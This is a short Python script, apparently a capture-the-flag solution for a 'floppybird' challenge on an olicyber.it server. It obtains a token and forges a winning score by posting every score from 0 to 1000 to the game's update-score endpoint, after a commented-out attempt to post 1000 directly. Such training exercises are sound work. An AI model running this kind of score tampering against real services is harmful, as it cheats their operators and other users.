import requests
import json 

url = "http://floppybird.challs.olicyber.it/"
token = json.loads(requests.get(url + "get-token").text)["token"]

#non funziona staticamente
"""
r = requests.post(url + "update-score", json={"token": token, "score": 1000}).text

for line in r.splitlines():
    if "flag{" in line.lower():
        print("flag:\n", line)

        
"""
for i in range(1001):
    r = requests.post(url + "update-score", json={"token": token, "score": i}).text
    if i==1000:
        print(r.strip(), i)